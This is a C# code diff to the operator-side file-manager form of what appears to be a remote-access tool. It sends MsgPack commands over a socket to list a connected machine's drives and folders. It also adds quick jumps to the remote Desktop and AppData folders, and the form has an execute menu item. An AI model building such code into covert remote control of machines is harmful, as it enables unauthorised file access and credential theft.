@@ -28,7 +28,7 @@ namespace Server.Forms
                     msgpack.ForcePathObject("Command").AsString = "getPath";
                     msgpack.ForcePathObject("Path").AsString = listView1.SelectedItems[0].ToolTipText;
                     ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
-                    toolStripStatusLabel1.Text = listView1.SelectedItems[0].ToolTipText;
+                    //toolStripStatusLabel1.Text = listView1.SelectedItems[0].ToolTipText;
                 }
             }
             catch
@@ -43,10 +43,11 @@ namespace Server.Forms
             {
                 MsgPack msgpack = new MsgPack();
                 string path = toolStripStatusLabel1.Text;
-                if (path.Length == 2)
+                if (path.Length <= 3)
                 {
                     msgpack.ForcePathObject("Packet").AsString = "fileManager";
                     msgpack.ForcePathObject("Command").AsString = "getDrivers";
+                    toolStripStatusLabel1.Text = "";
                     ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                     return;
                 }
@@ -54,7 +55,7 @@ namespace Server.Forms
                 msgpack.ForcePathObject("Packet").AsString = "fileManager";
                 msgpack.ForcePathObject("Command").AsString = "getPath";
                 msgpack.ForcePathObject("Path").AsString = path + "\\";
-                toolStripStatusLabel1.Text = path;
+                //toolStripStatusLabel1.Text = path;
                 ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
             }
             catch
@@ -62,6 +63,7 @@ namespace Server.Forms
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "fileManager";
                 msgpack.ForcePathObject("Command").AsString = "getDrivers";
+                toolStripStatusLabel1.Text = "";
                 ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                 return;
             }
@@ -169,16 +171,24 @@ namespace Server.Forms
         {
             try
             {
-                MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Packet").AsString = "fileManager";
-                msgpack.ForcePathObject("Command").AsString = "getPath";
-                msgpack.ForcePathObject("Path").AsString = toolStripStatusLabel1.Text;
-                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                if (toolStripStatusLabel1.Text != "")
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                    msgpack.ForcePathObject("Command").AsString = "getPath";
+                    msgpack.ForcePathObject("Path").AsString = toolStripStatusLabel1.Text;
+                    ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                }
+                else
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                    msgpack.ForcePathObject("Command").AsString = "getDrivers";
+                    ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                    return;
+                }
             }
-            catch
-            {
-
-            }
+            catch { }
         }
 
         private void eXECUTEToolStripMenuItem_Click(object sender, EventArgs e)
@@ -207,6 +217,40 @@ namespace Server.Forms
         private void Timer1_Tick(object sender, EventArgs e)
         {
             if (!C.ClientSocket.Connected) this.Close();
+        }
+
+        private void DESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                msgpack.ForcePathObject("Command").AsString = "getPath";
+                msgpack.ForcePathObject("Path").AsString = "DESKTOP";
+                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                //toolStripStatusLabel1.Text = "DESKTOP";
+            }
+            catch
+            {
+
+            }
+        }
+
+        private void APPDATAToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                msgpack.ForcePathObject("Command").AsString = "getPath";
+                msgpack.ForcePathObject("Path").AsString = "APPDATA";
+                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                //toolStripStatusLabel1.Text = "APPDATA";
+            }
+            catch
+            {
+
+            }
         }
     }
 }
